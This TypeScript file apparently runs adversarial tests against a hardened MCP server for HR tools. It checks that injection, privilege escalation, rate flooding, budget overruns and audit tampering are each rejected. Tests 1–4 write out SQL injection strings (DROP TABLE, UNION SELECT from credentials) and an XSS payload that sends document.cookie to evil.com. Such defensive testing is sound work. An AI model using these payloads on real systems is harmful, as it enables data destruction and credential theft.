import { HardenedMCPServer } from "../mcp/server.js";
import { MCPClient } from "../mcp/client.js";
import { checkWorkflowBudget } from "../graph/budget.js";
import type { GraphStateType } from "../graph/state.js";

export interface AdversarialTestResult {
  name: string;
  category: "injection" | "privilege_escalation" | "rate_limiting" | "budget_exhaustion" | "audit_tampering";
  passed: boolean;
  expectedBehavior: string;
  actualOutcome: string;
}

export async function runAdversarialTests(): Promise<{
  total: number;
  passed: number;
  failed: number;
  results: AdversarialTestResult[];
}> {
  const results: AdversarialTestResult[] = [];
  const server = new HardenedMCPServer();
  const client = new MCPClient(server);

  // Test 1: Stacked Query SQL Injection
  {
    const res = await client.callTool(
      "get_employee_record",
      { employeeId: "user-001; DROP TABLE employees; --" },
      { userId: "attacker-01", tenantId: "tenant-001", roles: ["employee"], scopes: ["employee:read"] }
    );
    const passed = !res.success && res.error?.code === "SECURITY_VIOLATION";
    results.push({
      name: "Stacked Query SQL Injection Defense",
      category: "injection",
      passed,
      expectedBehavior: "Block input with SECURITY_VIOLATION and reject execution",
      actualOutcome: passed ? "BLOCKED: Detected malicious SQL pattern" : `FAILED: ${JSON.stringify(res)}`
    });
  }

  // Test 2: Comment Masking SQL Injection
  {
    const res = await client.callTool(
      "get_employee_record",
      { employeeId: "user-001' --" },
      { userId: "attacker-01", tenantId: "tenant-001", roles: ["employee"], scopes: ["employee:read"] }
    );
    const passed = !res.success && res.error?.code === "SECURITY_VIOLATION";
    results.push({
      name: "Comment Masking SQL Injection Defense",
      category: "injection",
      passed,
      expectedBehavior: "Block SQL comment masking (--)",
      actualOutcome: passed ? "BLOCKED: Comment masking detected and rejected" : `FAILED: ${JSON.stringify(res)}`
    });
  }

  // Test 3: Union-Based SQL Injection
  {
    const res = await client.callTool(
      "query_department_stats",
      { department: "Engineering' UNION SELECT * FROM credentials WHERE '1'='1" },
      { userId: "attacker-01", tenantId: "tenant-001", roles: ["analyst"], scopes: ["analytics:read"] }
    );
    const passed = !res.success && res.error?.code === "SECURITY_VIOLATION";
    results.push({
      name: "UNION-based Data Exfiltration Defense",
      category: "injection",
      passed,
      expectedBehavior: "Reject UNION SELECT payload with SECURITY_VIOLATION",
      actualOutcome: passed ? "BLOCKED: UNION pattern blocked before execution" : `FAILED: ${JSON.stringify(res)}`
    });
  }

  // Test 4: Cross-Site Scripting (XSS) / Payload Injection
  {
    const res = await client.callTool(
      "query_department_stats",
      { department: "<script>fetch('https://evil.com?leak=' + document.cookie)</script>" },
      { userId: "attacker-01", tenantId: "tenant-001", roles: ["analyst"], scopes: ["analytics:read"] }
    );
    const passed = !res.success && res.error?.code === "SECURITY_VIOLATION";
    results.push({
      name: "Script Tag / Stored XSS Injection Defense",
      category: "injection",
      passed,
      expectedBehavior: "Block HTML script tags in tool arguments",
      actualOutcome: passed ? "BLOCKED: Script payload intercepted" : `FAILED: ${JSON.stringify(res)}`
    });
  }

  // Test 5: Privilege Escalation (Standard employee calling HR write tool)
  {
    const res = await client.callTool(
      "request_leave_approval",
      { employeeId: "user-001", days: 3, reason: "Vacation" },
      { userId: "user-001", tenantId: "tenant-001", roles: ["employee"], scopes: ["employee:read"] } // Missing hr:write
    );
    const passed = !res.success && res.error?.code === "UNAUTHORIZED";
    results.push({
      name: "RBAC Scope Privilege Escalation Prevention",
      category: "privilege_escalation",
      passed,
      expectedBehavior: "Reject with UNAUTHORIZED when caller lacks required 'hr:write' scope",
      actualOutcome: passed ? "DENIED: Missing required scope 'hr:write'" : `FAILED: ${JSON.stringify(res)}`
    });
  }

  // Test 6: Parameter Boundary Violation (Exceeding max leave limit)
  {
    const res = await client.callTool(
      "request_leave_approval",
      { employeeId: "user-001", days: 999, reason: "Excessive" },
      { userId: "user-001", tenantId: "tenant-001", roles: ["hr_admin"], scopes: ["hr:write"] }
    );
    const passed = !res.success && res.error?.code === "VALIDATION_ERROR";
    results.push({
      name: "Schema Boundary Validation Defense",
      category: "injection",
      passed,
      expectedBehavior: "Reject invalid parameter (days > 30) with VALIDATION_ERROR",
      actualOutcome: passed ? "REJECTED: Schema validation caught out-of-bounds parameter" : `FAILED: ${JSON.stringify(res)}`
    });
  }

  // Test 7: Sliding-Window Rate Limit Exhaustion
  {
    let rateLimited = false;
    for (let i = 0; i < 35; i++) {
      const res = await client.callTool(
        "get_employee_record",
        { employeeId: "user-001" },
        { userId: "flooder-01", tenantId: "tenant-001", roles: ["employee"], scopes: ["employee:read"] }
      );
      if (!res.success && res.error?.code === "RATE_LIMITED") {
        rateLimited = true;
        break;
      }
    }
    results.push({
      name: "Sliding-Window Rate Limit Flood Protection",
      category: "rate_limiting",
      passed: rateLimited,
      expectedBehavior: "Trigger RATE_LIMITED backpressure when client exceeds 30 requests/min",
      actualOutcome: rateLimited ? "THROTTLED: Rate limit triggered with retryAfter backpressure" : "FAILED: Rate limit not triggered"
    });
  }

  // Test 8: Budget Exhaustion Guard (Step Count Overrun)
  {
    const dummyState: GraphStateType = {
      question: "test",
      requestId: "req-1",
      traceId: "tr-1",
      userId: "u-1",
      tenantId: "tenant-001",
      roles: ["employee"],
      route: "rag",
      answer: "",
      status: "running",
      stepsUsed: 15,
      toolCallsUsed: 0,
      tokensUsed: 100,
      estimatedCostUsd: 0.001,
      maxSteps: 12,
      maxToolCalls: 8,
      maxCostUsd: 0.05,
      deadlineAt: Date.now() + 10000,
      budgetExceeded: false,
      hitlRequired: false,
      pendingApproval: null,
      approvalDecision: null,
      auditRecordIds: [],
      errors: []
    };
    const check = checkWorkflowBudget(dummyState);
    const passed = !check.allowed && check.reason.includes("Maximum workflow steps exceeded");
    results.push({
      name: "Workflow Step Budget Enforcement",
      category: "budget_exhaustion",
      passed,
      expectedBehavior: "Deny execution if stepsUsed exceeds maxSteps",
      actualOutcome: passed ? `GUARDED: ${check.reason}` : "FAILED"
    });
  }

  // Test 9: Cost Budget Overrun Guard
  {
    const dummyState: GraphStateType = {
      question: "test",
      requestId: "req-2",
      traceId: "tr-2",
      userId: "u-1",
      tenantId: "tenant-001",
      roles: ["employee"],
      route: "rag",
      answer: "",
      status: "running",
      stepsUsed: 2,
      toolCallsUsed: 0,
      tokensUsed: 100,
      estimatedCostUsd: 0.10,
      maxSteps: 12,
      maxToolCalls: 8,
      maxCostUsd: 0.05,
      deadlineAt: Date.now() + 10000,
      budgetExceeded: false,
      hitlRequired: false,
      pendingApproval: null,
      approvalDecision: null,
      auditRecordIds: [],
      errors: []
    };
    const check = checkWorkflowBudget(dummyState);
    const passed = !check.allowed && check.reason.includes("Maximum workflow cost exceeded");
    results.push({
      name: "Workflow Cost Budget Enforcement",
      category: "budget_exhaustion",
      passed,
      expectedBehavior: "Deny execution if estimatedCostUsd exceeds maxCostUsd",
      actualOutcome: passed ? `GUARDED: ${check.reason}` : "FAILED"
    });
  }

  // Test 10: Cryptographic Audit Hash Chain Integrity
  {
    const chainCheck = server.auditLogger.verifyChain();
    const count = server.auditLogger.getRecordCount();
    const passed = chainCheck.isValid && count >= 5;
    results.push({
      name: "Cryptographic SHA-256 Audit Trail Integrity",
      category: "audit_tampering",
      passed,
      expectedBehavior: "All adversarial attempts logged in unbroken SHA-256 hash chain",
      actualOutcome: passed ? `VERIFIED: ${count} audit events cryptographically verified unbroken` : "FAILED: Audit hash chain broken"
    });
  }

  const passedCount = results.filter((r) => r.passed).length;
  const failedCount = results.length - passedCount;

  return {
    total: results.length,
    passed: passedCount,
    failed: failedCount,
    results
  };
}
